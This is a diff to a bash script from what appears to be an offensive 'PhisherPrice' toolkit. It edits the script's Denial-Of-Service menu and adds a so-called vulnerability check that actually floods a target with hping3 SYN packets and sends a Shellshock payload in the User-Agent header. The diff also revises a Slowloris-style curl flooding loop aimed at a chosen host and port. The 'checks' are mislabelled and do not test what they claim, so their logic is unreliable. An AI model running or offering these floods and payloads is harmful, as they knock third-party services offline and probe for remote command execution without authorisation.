@@ -2729,70 +2729,107 @@ clear
 \e[0m\e[3;39m \e[1;31m
 Denial-Of-Service Toolkit
 \e[3;39m
-(1) Slowloris Attack
-(2) UDP/TCP Flood Attack
-(3) R-U-Dead-Yet Attack
-(4) SYN flood attack
+(1) Check If Vuln To DoS
+(2) Slowloris Attack
+(3) UDP/TCP Flood Attack
+(4) R-U-Dead-Yet Attack
+(5) SYN flood attack
 CTRL + C To Exit
 Press ENTER To Go To Main Menu
 '
-slowdos='1'
-udpdos='2'
-rudydos='3'
-synner='4'
+vuln2dos='1'
+slowdos='2'
+udpdos='3'
+rudydos='4'
+synner='5'
 
 wait
 echo -e $Blue" ┌─["$red"PhisherPrice$Blue]──[$red~$Blue]─["$yellow"DoS-Toolkit$Blue]:"
 echo -e $Blue" └─────► " ;read -p " CHOOSE: " x
-
-if [ "$x" == "$slowdos" ]; then                    #slowloris
+if [ "$x" == "$vuln2dos" ]; then                    #slowloris
 clear
-echo "Slowloris Type Attack"
-echo "Example: example.com 80 1024 60"
-read -p "Host" host
+# Prompt user for hostname or IP address
+echo "Enter a hostname or IP address to check for vulnerabilities:"
+read target
 
-read -p "Port" port
-
-read -p "Requests to send" requests
-
-read -p "Time to last (in seconds)" duration
-
-read -p "Delay between requests (in seconds)" delay
-
-read -p "Use HTTPS? [y/n]" use_https
-
-if [[ $use_https == "y" ]]; then
-  protocol="https"
+# Check for Slowloris attack
+echo "Checking for Slowloris attack..."
+if curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0" --connect-timeout 10 -m 60 -k -s -o /dev/null -w "%{http_code}" -H "Connection: close" -H "Accept-language: en-US,en,q=0.5" "${target}" | grep -q "4[0-9][0-9]\|5[0-9][0-9]"; then
+    echo "Slowloris attack detected!"
 else
-  protocol="http"
+    echo "Slowloris attack not detected."
 fi
 
-read -p "Randomize User-Agent header? [y/n]" randomize_ua
-
-if [[ $randomize_ua == "y" ]]; then
-  ua_flag="-H 'User-Agent: \$(shuf -n 1 user_agents.txt)'"
+# Check for UDP/TCP Flood attack
+echo "Checking for UDP/TCP Flood attack..."
+if hping3 -c 10000 -d 120 -S -w 64 -p 80 --flood "${target}" 2>&1 | grep -q "10000 packets transmitted, [0-9]* packets received, -100% packet loss"; then
+    echo "UDP/TCP Flood attack detected!"
 else
-  ua_flag=""
+    echo "UDP/TCP Flood attack not detected."
 fi
 
-endtime=$((SECONDS+duration))
+# Check for R-U-Dead-Yet attack
+echo "Checking for R-U-Dead-Yet attack..."
+if curl -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: en-US,en;q=0.5" -H "User-Agent: () { :; }; /bin/bash -c 'echo Vulnerable!'" -H "Connection: keep-alive" --connect-timeout 10 -m 60 -k -s -o /dev/null -w "%{http_code}" "${target}" | grep -q "5[0-9][0-9]"; then
+    echo "R-U-Dead-Yet attack detected!"
+else
+    echo "R-U-Dead-Yet attack not detected."
+fi
 
-echo "~To cancel the attack press 'Ctrl-C'"
-echo "|Hostname|            |Port|            |Requests|            |Duration|            |Delay|            |HTTPS|            |User-Agent|"
-echo "|$host|            |$port|            |$requests|            |$duration|            |$delay|            |$use_https|            |$randomize_ua|"
+# Check for SYN Flood attack
+echo "Checking for SYN Flood attack..."
+if hping3 -c 10000 -d 120 -S -w 64 --flood "${target}" 2>&1 | grep -q "10000 packets transmitted, [0-9]* packets received, -100% packet loss"; then
+    echo "SYN Flood attack detected!"
+else
+    echo "SYN Flood attack not detected."
+fi
+read
+elif [ "$x" == "$slowdos" ]; then                    #slowloris
+    clear
+    echo "Slowloris Type Attack"
+    read -p "Enter the hostname or IP address of the target: " host
+    read -p "Enter the port number of the target: " port
+    read -p "Enter the number of requests to send: " requests
+    read -p "Enter the time to last (in seconds): " duration
+    read -p "Enter the delay between requests (in seconds): " delay
+    read -p "Use HTTPS? [y/n]: " use_https
 
-while [ $SECONDS -lt $endtime ]; do
-  for ((i=0;i<$requests;i++)); do
-    if [[ $randomize_ua == "y" ]]; then
-      eval "curl -s -o /dev/null -k -m 10 --retry 0 $ua_flag ${protocol}://$host:$port/ >/dev/null 2>&1 &"
+    if [[ $use_https == "y" ]]; then
+      protocol="https"
     else
-      curl -s -o /dev/null -k -m 10 --retry 0 ${protocol}://$host:$port/ >/dev/null 2>&1 &
+      protocol="http"
     fi
-    sleep $delay
-  done
-done
 
-echo "Attack finished."
+    read -p "Randomize User-Agent header? [y/n]: " randomize_ua
+
+    if [[ $randomize_ua == "y" ]]; then
+      ua_flag="-H 'User-Agent: \$(shuf -n 1 user_agents.txt)'"
+    else
+      ua_flag=""
+    fi
+
+    endtime=$((SECONDS+duration))
+
+    echo "Starting Slowloris attack on $host:$port for $duration seconds with $requests requests and $delay second delay between requests."
+
+    while [ $SECONDS -lt $endtime ]; do
+      for ((i=0;i<$requests;i++)); do
+        if [[ $randomize_ua == "y" ]]; then
+          eval "curl -s -o /dev/null -k -m 10 --retry 0 $ua_flag ${protocol}://$host:$port/ >/dev/null 2>&1 &"
+        else
+          curl -s -o /dev/null -k -m 10 --retry 0 ${protocol}://$host:$port/ >/dev/null 2>&1 &
+        fi
+        sleep $delay
+      done
+      echo -ne "Slowloris attack in progress...\r"
+      sleep 0.5
+      echo -ne "                                                   \r"
+      sleep 0.5
+    done
+
+    echo "Slowloris attack on $host:$port finished."
+
+fi
 
 read
 
@@ -2928,13 +2965,6 @@ done
 
 echo "Attack finished."
 read
-
-else 
-
-n
-
-
-fi
 
 elif [ "$x" == "$option5" ]; then                          #Option5
 clear
